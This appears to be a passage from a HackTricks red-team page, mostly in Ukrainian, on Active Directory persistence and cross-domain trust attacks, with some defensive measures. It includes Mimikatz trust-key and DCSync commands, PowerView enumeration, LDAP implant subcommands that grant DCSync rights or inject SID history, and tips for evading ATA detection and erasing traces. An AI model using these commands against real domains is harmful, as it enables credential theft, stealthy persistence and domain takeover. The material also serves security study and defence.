{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Зловживати `dynamicObject` auxiliary class, створюючи короткоживучі principals/GPOs/DNS записів з `entryTTL`/`msDS-Entry-Time-To-Die`; вони самостійно видаляються без tombstones, стираючи LDAP докази та залишаючи orphan SIDs, broken `gPLink` references або кешовані DNS відповіді (наприклад, AdminSDHolder ACE pollution або зловмисні `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Змінити **LSASS** в пам'яті, щоб встановити **universal password**, що дає доступ до всіх доменних акаунтів.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Ви можете створити власний **SSP** щоб **capture** в **clear text** credentials, що використовуються для доступу до машини.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Реєструє новий Domain Controller в AD і використовує його, щоб **push attributes** (SIDHistory, SPNs...) на вказані об'єкти **without** залишення логів про ці **modifications**. Потрібні DA привілеї і бути всередині **root domain**.\
Зверніть увагу, якщо використати некоректні дані, з'являться досить помітні логи.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Раніше ми обговорювали, як ескалювати привілеї, якщо маєте достатні permissions для читання LAPS passwords. Однак ці паролі також можна використовувати для **maintain persistence**.\
Див.:

{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft розглядає **Forest** як межу безпеки. Це означає, що **compromising a single domain could potentially lead to the entire Forest being compromised**.

### Basic Information

A [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) — це механізм безпеки, що дозволяє користувачу з одного **domain** отримувати доступ до ресурсів в іншому **domain**. Це створює зв'язок між системами аутентифікації двох доменів, дозволяючи перевіркам аутентифікації проходити прозоро. Коли домени налаштовують trust, вони обмінюються і зберігають певні **keys** у своїх **Domain Controllers (DCs)**, які критичні для цілісності довіри.

У типовому сценарії, якщо користувач хоче доступитися до сервісу в **trusted domain**, він повинен спочатку попросити спеціальний квиток, відомий як **inter-realm TGT**, від свого DC. Цей TGT шифрується з використанням shared **key**, який погоджено між доменами. Потім користувач пред'являє цей TGT до **DC of the trusted domain**, щоб отримати service ticket (**TGS**). Після успішної валідації inter-realm TGT DC довереного домену видає TGS, даючи користувачу доступ до сервісу.

**Steps**:

1. **A client computer** in **Domain 1** починає процес, використовуючи свій **NTLM hash** для запиту **Ticket Granting Ticket (TGT)** у свого **Domain Controller (DC1)**.
2. DC1 видає новий TGT, якщо клієнт автентифікований успішно.
3. Потім клієнт запитує **inter-realm TGT** у DC1, який потрібен для доступу до ресурсів у **Domain 2**.
4. Inter-realm TGT шифрується з допомогою **trust key**, що поділяється між DC1 і DC2 в рамках двосторонньої domain trust.
5. Клієнт відносить inter-realm TGT до **Domain 2's Domain Controller (DC2)**.
6. DC2 верифікує inter-realm TGT за допомогою свого shared trust key і, якщо він валідний, видає **Ticket Granting Service (TGS)** для сервера у Domain 2, до якого клієнт хоче отримати доступ.
7. Нарешті, клієнт пред'являє цей TGS серверу, який зашифрований з hash акаунту сервера, щоб отримати доступ до сервісу в Domain 2.

### Different trusts

Важливо зауважити, що **a trust can be 1 way or 2 ways**. У двосторонньому варіанті обидва домени довіряють один одному, але в **1 way** trust відносинах один із доменів буде **trusted**, а інший — **trusting**. В останньому випадку **ви зможете доступатися лише до ресурсів inside the trusting domain з trusted one**.

Якщо Domain A trusts Domain B, A — trusting domain, а B — trusted domain. Більше того, в **Domain A** це буде **Outbound trust**; а в **Domain B** — **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Типова конфігурація всередині одного forest, де child domain автоматично має двосторонню транзитивну довіру з parent domain. Це означає, що запити на аутентифікацію можуть вільно проходити між parent і child.
- **Cross-link Trusts**: Називають "shortcut trusts", встановлюються між child domains для пришвидшення referral process. У складних лісах referral зазвичай має йти вгору до forest root, а потім вниз до цільового домену. Cross-links скорочують цю подорож, що корисно в географічно розподілених середовищах.
- **External Trusts**: Налаштовуються між різними, не пов'язаними доменами і за своєю природою не транзитивні. За [документацією Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts корисні для доступу до ресурсів у домені за межами поточного forest, який не пов'язаний forest trust. Безпеку підсилюють через SID filtering при external trusts.
- **Tree-root Trusts**: Автоматично встановлюються між forest root domain і новим tree root. Хоча зустрічаються рідше, tree-root trusts важливі для додавання нових domain trees до forest, дозволяючи їм зберігати унікальне доменне ім'я та забезпечуючи двосторонню транзитивність. Більше інформації в [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Тип довіри — двосторонній транзитивний trust між двома forest root domains, також застосовує SID filtering для посилення безпеки.
- **MIT Trusts**: Встановлюються з не-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains. MIT trusts спеціалізовані і підходять для середовищ, що вимагають інтеграції з Kerberos-сумісними системами поза Windows екосистемою.

#### Other differences in **trusting relationships**

- Trust relationship може бути **transitive** (A trust B, B trust C, тоді A trust C) або **non-transitive**.
- Trust relationship може бути налаштована як **bidirectional trust** (обидва довіряють один одному) або як **one-way trust** (лише один довіряє іншому).

### Attack Path

1. **Enumerate** trusting relationships
2. Перевірити, чи будь-який **security principal** (user/group/computer) має **access** до ресурсів **other domain**, можливо через ACE entries або шляхом перебування в groups іншого домену. Шукайте **relationships across domains** (довіра ймовірно була створена для цього).
1. kerberoast у цьому випадку також може бути опцією.
3. **Compromise** accounts, які можуть **pivot** через домени.

Нападники можуть отримати доступ до ресурсів в іншому домені через три основні механізми:

- **Local Group Membership**: Principals можуть бути додані до локальних груп на машинах, наприклад до групи “Administrators” на сервері, що дає їм значний контроль над тією машиною.
- **Foreign Domain Group Membership**: Principals також можуть бути членами груп у чужому домені. Однак ефективність цього методу залежить від типу довіри і області дії групи.
- **Access Control Lists (ACLs)**: Principals можуть бути вказані в **ACL**, зокрема як сутності в **ACEs** всередині **DACL**, надаючи їм доступ до певних ресурсів. Для глибшого розуміння механіки ACLs, DACLs і ACEs корисно прочитати whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)”.

### Find external users/groups with permissions

Ви можете перевірити **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** щоб знайти foreign security principals у домені. Це будуть user/group з **an external domain/forest**.

Ви можете перевірити це в **Bloodhound** або використовуючи powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Інші способи перерахувати довірчі відносини між доменами:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> There are **2 trusted keys**, one for _Child --> Parent_ and another one for _Parent_ --> _Child_.\
> Ви можете дізнатися, який ключ використовується поточним доменом за допомогою:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Ескалюйте привілеї до Enterprise admin у child/parent domain, зловживаючи довірою за допомогою SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Розуміння того, як можна експлуатувати Configuration Naming Context (NC), є критично важливим. Configuration NC слугує центральним сховищем конфігураційних даних по всьому forest в середовищах Active Directory (AD). Ці дані реплікуються на кожен Domain Controller (DC) у forest, а writable DCs зберігають записувану копію Configuration NC. Щоб це експлуатувати, потрібно мати **SYSTEM privileges on a DC**, бажано child DC.

**Link GPO to root DC site**

Контейнер Sites в Configuration NC містить інформацію про сайти всіх комп'ютерів, приєднаних до домену, у AD forest. Маючи SYSTEM privileges на будь‑якому DC, атакуючі можуть прив'язувати GPOs до root DC sites. Ця дія потенційно ставить під загрозу root domain шляхом маніпуляцій політиками, застосованими до цих сайтів.

Для детальної інформації можна ознайомитись з дослідженням [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Вектор атаки передбачає націлювання на привілейовані gMSAs всередині домену. KDS Root key, необхідний для обчислення паролів gMSA, зберігається в Configuration NC. Маючи SYSTEM privileges на будь‑якому DC, можна отримати доступ до KDS Root key і обчислити паролі будь‑якого gMSA по всьому forest.

Детальний аналіз та покрокові інструкції можна знайти в:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Доповнюча делегована атака MSA (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Додаткові зовнішні дослідження: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Цей метод вимагає терпіння — очікування створення нових привілейованих AD об'єктів. Маючи SYSTEM privileges, атакуючий може змінити AD Schema, щоб надати будь‑якому користувачу повний контроль над усіма класами. Це може призвести до несанкціонованого доступу та контролю над новоствореними AD об'єктами.

Детальніше про це — у дослідженні [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Уразливість ADCS ESC5 спрямована на отримання контролю над об'єктами Public Key Infrastructure (PKI) для створення шаблону сертифіката, який дозволяє автентифікуватися як будь‑який користувач у forest. Оскільки PKI об'єкти розташовані в Configuration NC, компрометація writable child DC дозволяє виконати ESC5 атаки.

Більш детально про це — у [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). У сценаріях без ADCS атакуючий може розгорнути необхідні компоненти, як описано в [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
У цьому сценарії **ваш домен довірений** зовнішнім доменом, який надає вам **невизначені права** над ним. Вам потрібно з'ясувати, **які принципали вашого домену мають який доступ до зовнішнього домену**, а потім спробувати це використати:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Зовнішній Forest-домен — односторонній (вихідний)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
У цьому сценарії **ваш домен** **довіряє** деякі **привілеї** principal з **іншого домену**.

Однак коли **домен отримує довіру** від довіряючого домену, trusted domain **створює користувача** з **передбачуваною назвою**, який використовує як **пароль — trusted password**. Це означає, що можливо **використати користувача з довіряючого домену, щоб потрапити всередину trusted домену**, перелічити об'єкти й намагатися підвищити привілеї:

{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Інший спосіб скомпрометувати trusted домен — знайти [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links), створений в **протилежному напрямку** довірчих відносин (що трапляється не дуже часто).

Ще один спосіб скомпрометувати trusted домен — чекати на машині, до якої **користувач з trusted домену може підключитися** через **RDP**. Тоді атакуючий може інжектувати код у процес RDP-сесії й **доступитися до origin domain жертви** звідти.\
Крім того, якщо **жертва підключила свій жорсткий диск**, з процесу **RDP session** атакувальник може записати **backdoors** у **startup folder of the hard drive**. Ця техніка називається **RDPInception.**

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Міри проти зловживань довірчих відносин домену

### **SID Filtering:**

- Ризик атак, що використовують атрибут SID history через forest trusts, зменшується за допомогою SID Filtering, який увімкнено за замовчуванням на всіх inter-forest trusts. Це базується на припущенні, що intra-forest trusts є безпечними, оскільки Microsoft розглядає forest, а не domain, як межу безпеки.
- Проте є нюанс: SID filtering може порушити роботу додатків і доступ користувачів, через що його іноді відключають.

### **Selective Authentication:**

- Для inter-forest trusts застосування Selective Authentication гарантує, що користувачі з двох forests не автентифікуються автоматично. Натомість потрібні явні дозволи, щоб користувачі могли отримати доступ до domains і серверів у довіряючому домені або forest.
- Важливо зауважити, що ці заходи не захищають від експлуатації writable Configuration Naming Context (NC) або атак на trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) реалізує примітиви bloodyAD-style LDAP як x64 Beacon Object Files, які виконуються повністю всередині on-host implant (наприклад, Adaptix C2). Оператори компілюють пакет командою `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, завантажують `ldap.axs`, а потім викликають `ldap <subcommand>` з beacon. Весь трафік використовує поточний контекст безпеки логону по LDAP (389) із signing/sealing або LDAPS (636) з автоматичною довірою сертифікатів, тож не потрібні socks-проксі чи артефакти на диску.

### Перелік LDAP з боку імпланта

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` резолвлять короткі імена/шляхи OU в повні DNs і дамплять відповідні об'єкти.
- `get-object`, `get-attribute`, and `get-domaininfo` витягують довільні атрибути (включаючи security descriptors) плюс метадані forest/domain з `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` показують roasting candidates, налаштування delegation та існуючі [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) дескриптори безпосередньо з LDAP.
- `get-acl` and `get-writable --detailed` парсять DACL, щоб перерахувати trustees, права (GenericAll/WriteDACL/WriteOwner/attribute writes) і наслідування, даючи негайні цілі для ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) дають оператору змогу розмістити нові principals або machine accounts будь-де, де є права на OU. `add-groupmember`, `set-password`, `add-attribute`, і `set-attribute` безпосередньо перехоплюють цілі після отримання прав write-property.
- ACL-focused commands такі як `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, і `add-dcsync` перетворюють WriteDACL/WriteOwner на будь-якому AD об'єкті в скидання паролів, контроль членства в групах або привілеї DCSync без залишення PowerShell/ADSI артефактів. `remove-*` аналоги очищають інжектовані ACE.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` миттєво роблять скомпрометованого користувача Kerberoastable; `add-asreproastable` (UAC toggle) позначає його для AS-REP roasting без чіпання пароля.
- Делегаційні макроси (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) переписують `msDS-AllowedToDelegateTo`, UAC flags, або `msDS-AllowedToActOnBehalfOfOtherIdentity` з beacon'а, що відкриває шляхи атак constrained/unconstrained/RBCD і усуває потребу у віддаленому PowerShell або RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` інжектує привілейовані SIDs у SID history контрольованого principal’а (див. [SID-History Injection](sid-history-injection.md)), забезпечуючи приховане наслідування доступу повністю через LDAP/LDAPS.
- `move-object` змінює DN/OU комп’ютерів або користувачів, дозволяючи нападнику перемістити активи в OUs, де вже існують делеговані права, перед тим як зловживати `set-password`, `add-groupmember`, або `add-spn`.
- Тісно спрямовані команди видалення (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` тощо) дозволяють швидко відкотити зміни після того, як оператор зібрав облікові дані або забезпечив персистентність, мінімізуючи телеметрію.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Рекомендується дозволяти Domain Admins входити тільки на Domain Controllers, уникаючи їх використання на інших хостах.
- **Service Account Privileges**: Сервіси не повинні запускатися з привілеями Domain Admin (DA) для збереження безпеки.
- **Temporal Privilege Limitation**: Для задач, що потребують DA привілеїв, слід обмежувати їх тривалість. Це можна досягти за допомогою: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Аудит Event IDs 2889/3074/3075, а потім примусово увімкнути LDAP signing плюс LDAPS channel binding на DCs/клієнтах, щоб блокувати LDAP MITM/relay спроби.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementing Deception Techniques**

- Впровадження deception включає встановлення пасток, таких як приманки-користувачі або комп’ютери, з характеристиками на кшталт паролів, що не спливають, або позначених як Trusted for Delegation. Детальний підхід включає створення користувачів з конкретними правами або додавання їх до високопривілейованих груп.
- Практичний приклад включає використання інструментів, таких як: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Більше про розгортання deceptive технік можна знайти на [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Підозрілі індикатори включають нетиповий ObjectSID, рідкісні логіни, дати створення та низькі лічильники неправильних паролів.
- **General Indicators**: Порівняння атрибутів потенційних приманок з атрибутами справжніх об’єктів може виявити невідповідності. Інструменти на кшталт [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) можуть допомогти в ідентифікації таких deception.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Уникнення обліку сесій на Domain Controllers, щоб запобігти виявленню ATA.
- **Ticket Impersonation**: Використання **aes** ключів для створення квитків допомагає уникати виявлення, оскільки не відбувається пониження до NTLM.
- **DCSync Attacks**: Рекомендовано виконувати з non-Domain Controller, щоб уникнути виявлення ATA, оскільки виконання безпосередньо з Domain Controller викликатиме сповіщення.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
